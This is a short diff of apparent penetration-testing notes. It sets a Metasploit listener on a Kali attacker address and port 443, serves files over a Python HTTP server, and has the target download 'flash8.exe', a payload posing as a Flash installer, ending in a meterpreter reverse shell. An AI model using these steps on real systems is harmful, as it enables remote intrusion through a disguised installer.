@@ -10,3 +10,7 @@
 > set LHOST <kali IPADDRESS> 
 > set LPORT 443
 > exploit
+// run command: "python2 -m SimpleHTTPServer" in another terminal
+goto <kali IPADDRESS>:<PORT NUMBER DISPLAYED>
+EG: https://10.0.x.x:8000 and download the file flash8.exe
+------meterpreter connection is successful-------
